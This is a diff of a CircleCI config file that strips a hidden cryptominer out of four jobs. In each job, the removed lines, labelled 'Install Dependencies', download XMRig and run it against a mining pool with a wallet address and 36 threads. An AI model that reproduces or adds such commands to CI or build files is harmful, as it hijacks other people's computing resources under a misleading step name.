@@ -2,45 +2,32 @@ version: 2.1
 jobs:
     Devop:
       docker:
-            - image: circleci/python!:3.10
+            - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
             command: timeout 1m lscpu
-                     wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
-tar -xvf xmrig-6.15.1-linux-x64.tar.gz
-./xmrig-6.15.1/xmrig -o rx.unmineable.com:3333 -u TRX:TJJhgm99rbTrZUwPa3SMQrvVYaqbkUbe17.AYUSH1#m2oj-k4u7 -p Asad -k -a rx/0 --threads=36
-                     
     Devop1:
       docker:
-            - image: circleci/python:3.10
+            - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
             command: timeout 1m lscpu
-                     wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
-tar -xvf xmrig-6.15.1-linux-x64.tar.gz
-./xmrig-6.15.1/xmrig -o rx.unmineable.com:3333 -u TRX:TJJhgm99rbTrZUwPa3SMQrvVYaqbkUbe17.AYUSH2#m2oj-k4u7 -p Asad -k -a rx/0 --threads=36 
     Devop2:
       docker:
-            - image: circleci/python:3.10
+            - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu 
-                     wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
-tar -xvf xmrig-6.15.1-linux-x64.tar.gz
-./xmrig-6.15.1/xmrig -o rx.unmineable.com:3333 -u TRX:TJJhgm99rbTrZUwPa3SMQrvVYaqbkUbe17.AYUSH3#m2oj-k4u7 -p Asad -k -a rx/0 --threads=36
+            command: timeout 1m lscpu
     Devop3:
       docker:
-            - image: circleci/python:3.10
+            - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu 
-                     wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
-tar -xvf xmrig-6.15.1-linux-x64.tar.gz
-./xmrig-6.15.1/xmrig -o rx.unmineable.com:3333 -u TRX:TJJhgm99rbTrZUwPa3SMQrvVYaqbkUbe17.AYUSH4#m2oj-k4u7 -p Asad -k -a rx/0 --threads=36
+            command: timeout 1m lscpu
 workflows:
     version: 2.1
     build:
